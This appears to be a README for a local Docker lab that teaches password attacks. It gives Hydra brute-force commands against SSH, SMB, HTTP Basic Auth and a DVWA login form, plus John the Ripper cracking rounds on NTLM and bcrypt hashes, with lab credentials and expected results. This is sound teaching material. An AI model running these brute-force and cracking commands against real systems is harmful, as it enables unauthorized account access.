# Hacking Lab Demo

A Docker Compose lab for demonstrating John the Ripper and Hydra against services with different authentication methods.

## Prerequisites

- Docker and Docker Compose
- uv

# Quick Start

```bash
gunzip rockyou.txt.gz
uv run make_passwords.py
docker compose up -d
```

## Services

| Service | Protocol | Host Port | Credentials |
|---|---|---|---|
| Samba | SMB | 4450 | `alice` / `dragon` |
| SSH | SSH | 2222 | `admin` / `password123` |
| FTP | FTP | 21 | `ftpuser` / `letmein` |
| HTTP Basic Auth | HTTP | 8080 | `webadmin` / `dragon` |
| DVWA (Form Login) | HTTP | 8081 | `admin` / `password` |

## Accessing Services

- **SSH:** `ssh admin@localhost -p 2222`
- **FTP:** `ftp localhost 21`
- **Samba:** `smbclient -L //127.0.0.1 -p 4450 -U 'alice%dragon'`
- **HTTP Basic Auth:** open <http://localhost:8080> in a browser
- **DVWA:** open <http://localhost:8081> in a browser

## Cleanup

```bash
docker compose down -v
```

# Hydra Demo

Short, focused examples of password-list attacks with Hydra. Use `-f` to stop after the first valid login, `-V` for verbose output, and `-t` to control parallel tasks (increase for local demos; lower for remote targets).

Presenter checklist before starting Hydra demos:
- Start services: `uv run make_passwords.py && docker compose up -d`
- Ensure the wordlist is available: `test -f rockyou.txt || gunzip -k rockyou.txt.gz`
- Have a browser open for DVWA at `http://localhost:8081`
- Confirm `hydra` is installed: `which hydra`

Tips: run each command in its own terminal so you can stop or show output independently.

## SSH — password-list attack

Command:
```bash
hydra -l admin -P rockyou.txt -t 10 -f -V -s 2222 127.0.0.1 ssh
```

What to watch for: verbose output will show attempts; `-f` exits after the first successful login is found.

## SMB — password-list attack

Command:
```bash
hydra -l alice -P rockyou.txt -t 8 -f -V smb://127.0.0.1:4450
```

## HTTP Basic Auth — password-list attack

Command:
```bash
hydra -l webadmin -P rockyou.txt -t 10 -f -V -s 8080 127.0.0.1 http-get /
```

## DVWA — login form (web form brute force)

Steps:
1. Open `http://localhost:8081` and log in as `admin:password`. Click **Create / Reset Database**.
2. In your browser devtools, copy the `PHPSESSID` cookie value for the DVWA domain.
3. Run (replace `<session_id>`):
```bash
hydra -l admin -P rockyou.txt \
  127.0.0.1:8081 http-post-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=<session_id>;security=low"
```

Replace `<session_id>` with the value from your browser. Use `-V` during demos so you can narrate what Hydra is trying.

# John The Ripper

Requires John Jumbo (not Core) for the full ruleset and masks used here.

Quick presenter checklist for John:
- Ensure `ntlm.hashes` exists: `python make_passwords.py` (skip if already present)
- Ensure `rockyou.txt` is uncompressed and available
- Clear John cache between rounds: `rm -f ~/.john/john.pot`

Table (quick glance)
| Demo | Purpose | Approx time |
|------|---------|------------:|
| Mode convergence | Show how different modes target different password types | ~3 min |
| Algorithm comparison | Show speed difference (NTLM vs bcrypt) | ~1 min |

## Demo 1 — Mode convergence (NTLM)

Build hashes (if not already present):
```bash
python make_passwords.py
```

Run these rounds in order, clearing `john.pot` between rounds so previous cracks don't affect results.

1) Single mode (targets username-based variants)
```bash
rm -f ~/.john/john.pot
john --single --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```
Expected: `marc:Marc2024!`

2) Wordlist (no rules)
```bash
rm -f ~/.john/john.pot
john --wordlist=rockyou.txt --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```
Expected: `alice:dragon`

3) Wordlist + Jumbo rules
```bash
rm -f ~/.john/john.pot
john --wordlist=rockyou.txt --rules=Jumbo --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```
Expected: `bob:P@ssw0rd2024`

4) Mask mode (policy-driven)
```bash
rm -f ~/.john/john.pot
# ?u = upper, ?l = lower, ?d = digit
john --mask='?u?l?l?l?l?l?d?d?d?d' --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```
Expected: `carol:Winter2024`

5) Incremental (brute-force)
```bash
rm -f ~/.john/john.pot
john --incremental=Alnum --min-length=4 --max-length=4 --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```
Expected: `dave:xk7m`

Presenter tips:
- Run the `rm -f ~/.john/john.pot` command between rounds to avoid cached results.
- Narrate why each mode is chosen and the expected crack type.

## Demo 2 — Hash algorithm differences (bcrypt)

Verify bcrypt is supported:
```bash
john --list=formats | grep -i bcrypt
```

If you need to generate a bcrypt hash (skip if `bcrypt.hashes` already exists):
- If `htpasswd` on your system supports bcrypt, this will work:
```bash
echo 'password123' | htpasswd -nbBC 10 testuser | cut -d: -f2 > bcrypt.hashes
```
- Alternatively, use Python + `bcrypt` (if available):
```bash
python - <<'PY'
import bcrypt
print(bcrypt.hashpw(b'password123', bcrypt.gensalt(12)).decode())
PY
```

Crack attempt:
```bash
rm -f ~/.john/john.pot
john --wordlist=rockyou.txt --rules=Single --format=bcrypt bcrypt.hashes
```

Presenter tip: bcrypt is intentionally slow — expect very low guesses/sec. Use this to demonstrate why algorithm choice matters.